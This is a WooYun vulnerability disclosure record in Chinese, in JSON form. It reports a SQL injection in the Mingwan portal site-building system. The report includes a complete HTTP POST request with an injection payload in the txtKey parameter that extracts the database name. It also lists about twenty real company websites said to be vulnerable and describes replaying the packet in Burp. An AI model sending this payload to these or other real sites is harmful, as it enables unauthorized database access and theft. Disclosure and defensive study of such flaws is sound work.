{"id": 17956, "wybug_id": "wooyun-2015-0116961", "wybug_title": "铭万行业门户建站系统存在通用注入漏洞 涉及数十万企业用户", "wybug_corp": "铭万信息技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-05-29 15:40", "wybug_open_date": "2015-07-13 15:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 看了这个洞http://wooyun.org/bugs/wooyun-2015-0104558 给了18r上了主页 感觉不错 就拿他的案例测试 详细说明：  官网http://jianzhan.b2b.cn权限也是很大 sa db权限\nPOST /messageboard/default.aspx HTTP/1.1Content-Length: 262Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Referer: http://www.norsencn.com:80/ Cookie: ASP.NET_SessionId=jjepzkjcudzxkgyu4zypm055 Host: www.norsencn.comConnection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.3Accept: */* DefaultModule1%24rbIsReply=1&DefaultModule1%24txtKey=' And 1=(select db_name())%20and+'%'='&hidIsreply=DefaultModule1%24rbIsReply\nDefaultModule1%24txtKey参数未过滤  可注入因为是post数据。所以直接用burp测试。看图片把。。网站：www.jindadou.cn看数据库名\n\n看版本\n\nwww.cqjgfq.cn\n\nwww.tianruiaircooler.com\n\nwww.norsencn.com\n\n\n附部分案例。用上面的数据包。直接放burp里面发包即可得到数据库名称。http://www.norsencn.comhttp://www.kowafoods.com.cn/http://www.szyt.com.cnhttp://www.jiahua-food.comhttp://www.jindadou.cnhttp://www.tianruiaircooler.comhttp://www.cqjgfq.cnhttp://fz.yanshi.b2b.cnhttp://www.zwcy.comhttp://www.norsencn.comhttp://www.sanxin-med.comhttp://www.qingheasia.comhttp://www.schkpackage.comhttp://www.jxjgej.comhttp://www.3zhong.cnhttp://www.coupling.com.cnhttp://www.autoshenyang.comhttp://www.cqfuyuan.comhttp://www.cqkehong.comhttp://www.dletyy.comhttp://www.jinkuaizi.com\n数据库名和数据库版本都出来了，还不够证明么？昨天就这样提交的不给通过。难道非得一个一个把字段跑出来库脱下来才叫证明？   漏洞证明：  官网http://jianzhan.b2b.cn权限也是很大 sa db权限\nPOST /messageboard/default.aspx HTTP/1.1Content-Length: 262Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Referer: http://www.norsencn.com:80/ Cookie: ASP.NET_SessionId=jjepzkjcudzxkgyu4zypm055 Host: www.norsencn.comConnection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.3Accept: */* DefaultModule1%24rbIsReply=1&DefaultModule1%24txtKey=' And 1=(select db_name())%20and+'%'='&hidIsreply=DefaultModule1%24rbIsReply\nDefaultModule1%24txtKey参数未过滤  可注入因为是post数据。所以直接用burp测试。看图片把。。网站：www.jindadou.cn看数据库名\n\n看版本\n\nwww.cqjgfq.cn\n\nwww.tianruiaircooler.com\n\nwww.norsencn.com\n\n\n附部分案例。用上面的数据包。直接放burp里面发包即可得到数据库名称。http://www.norsencn.comhttp://www.kowafoods.com.cn/http://www.szyt.com.cnhttp://www.jiahua-food.comhttp://www.jindadou.cnhttp://www.tianruiaircooler.comhttp://www.cqjgfq.cnhttp://fz.yanshi.b2b.cnhttp://www.zwcy.comhttp://www.norsencn.comhttp://www.sanxin-med.comhttp://www.qingheasia.comhttp://www.schkpackage.comhttp://www.jxjgej.comhttp://www.3zhong.cnhttp://www.coupling.com.cnhttp://www.autoshenyang.comhttp://www.cqfuyuan.comhttp://www.cqkehong.comhttp://www.dletyy.comhttp://www.jinkuaizi.com\n数据库名和数据库版本都出来了，还不够证明么？昨天就这样提交的不给通过。难道非得一个一个把字段跑出来库脱下来才叫证明？   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}